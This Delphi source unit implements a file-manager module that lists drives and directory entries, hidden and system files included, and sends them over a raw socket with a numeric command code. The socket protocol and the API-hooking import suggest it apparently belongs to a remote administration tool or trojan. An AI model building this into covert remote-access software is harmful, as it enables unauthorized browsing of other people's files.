unit uFilemanager;

interface
uses Windows,magicapihooks,winsock;
const
  faReadOnly  = $00000001;
  faHidden    = $00000002;
  faSysFile   = $00000004;
  faVolumeID  = $00000008;
  faDirectory = $00000010;
  faArchive   = $00000020;
  faAnyFile   = $0000003F;
  
Type
  TFileName = type string;
  TSearchRec = record
    Time: Integer;
    Size: Integer;
    Attr: Integer;
    Name: TFileName;
    ExcludeAttr: Integer;
    FindHandle: THandle;
    FindData: TWin32FindData;
  end;

  LongRec = packed record
    case Integer of
      0: (Lo, Hi: Word);
      1: (Words: array [0..1] of Word);
      2: (Bytes: array [0..3] of Byte);
  end;

type
  TFilemanager = class
  private
    function FindMatchingFile(var F: TSearchRec): Integer;
    function FindNext(var F: TSearchRec): Integer;
    function FindFirst(const Path: string; Attr: Integer; var  F: TSearchRec): Integer;
    procedure FindClose(var F: TSearchRec);
  public
    function GetDrivez: string;
    Procedure GenerateList(Dir: String; dNr: Integer; sSocket:integer);
  end;
var
  Filemanager: TFilemanager;
implementation

procedure TFilemanager.FindClose(var F: TSearchRec);
begin
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Windows.FindClose(F.FindHandle);
    F.FindHandle := INVALID_HANDLE_VALUE;
  end;
end;

function TFilemanager.FindMatchingFile(var F: TSearchRec): Integer;
var
  LocalFileTime: TFileTime;
begin
  with F do
  begin
    while FindData.dwFileAttributes and ExcludeAttr <> 0 do
      if not FindNextFile(FindHandle, FindData) then
      begin
        Result := GetLastError;
        Exit;
      end;
    FileTimeToLocalFileTime(FindData.ftLastWriteTime, LocalFileTime);
    FileTimeToDosDateTime(LocalFileTime, LongRec(Time).Hi, LongRec(Time).Lo);
    Size := FindData.nFileSizeLow;
    Attr := FindData.dwFileAttributes;
    Name := FindData.cFileName;
  end;
  Result := 0;
end;

function TFilemanager.GetDrivez: string;
var
  r: LongWord;
  Drives: array[0..128] of char;
  pDrive: pchar;
begin
  Result := '';
  r := GetLogicalDriveStrings(sizeof(Drives), Drives);
  if r = 0 then exit;
  pDrive := Drives;
  while pDrive^ <> #0 do begin
    result := result + pdrive + '|';
    inc(pDrive, 4);
  end;
end;

Procedure TFilemanager.GenerateList(Dir: String; dNr: Integer; sSocket:integer);
Var
  SR    :TSearchRec;
  Temp  :String;
  Att   :String;
  sTemp:string;
Begin
  If (Dir = '') Then Exit;
  If (Dir[Length(Dir)] <> '\') Then Dir := Dir + '\';
  If FindFirst(Dir + '*.*', faDirectory or faHidden or faSysFile or faVolumeID or faArchive or faAnyFile, SR) = 0 Then
  Repeat
    if dnr = 2 then begin
    If ((SR.Attr And faDirectory) <> faDirectory) Then Begin
      Att := '';
      If ((SR.Attr and faReadOnly) = faReadOnly) Then Att := Att + 'R/';
      If ((SR.Attr and faHidden) = faHidden) Then Att := Att + 'H/';
      If ((SR.Attr and faSysFile) = faSysFile) Then Att := Att + 'S/';
      If ((SR.Attr and faVolumeID) = faVolumeID) Then Att := Att + 'V/';
      If ((SR.Attr and faArchive) = faArchive) Then Att := Att + 'A/';
      If ((SR.Attr and faAnyFile) = faAnyFile) Then Att := Att + 'An/';

      If Copy(Att, length(Att), 1) = '/' Then
        Delete(Att, Length(Att), 1);
      if sr.name <> '..' then begin
      sTemp := '|'+Att+'#'+IntToStr(SR.Size)+'#'+SR.Name;
      Temp := Temp +  sTemp;
      end;
    end;
    end else begin
      If ((SR.Attr And faDirectory) = faDirectory) Then
      Begin
        sTemp := '|DIR#0#'+SR.Name;
        Temp := Temp +  sTemp;
      End;
    end;
  Until FindNext(SR) <> 0;
  Temp := IntToStr(18)+ Temp + #10;
  Send(sSocket, Temp[1], Length(Temp), 0);
End;

function TFilemanager.FindFirst(const Path: string; Attr: Integer;
  var  F: TSearchRec): Integer;
const
  faSpecial = faHidden or faSysFile or faVolumeID or faDirectory;
begin
  F.ExcludeAttr := not Attr and faSpecial;
  F.FindHandle := FindFirstFile(PChar(Path), F.FindData);
  if F.FindHandle <> INVALID_HANDLE_VALUE then
  begin
    Result := FindMatchingFile(F);
    if Result <> 0 then FindClose(F);
  end else
    Result := GetLastError;
end;

function TFilemanager.FindNext(var F: TSearchRec): Integer;
begin
  if FindNextFile(F.FindHandle, F.FindData) then
    Result := FindMatchingFile(F) else
    Result := GetLastError;
end;
end.
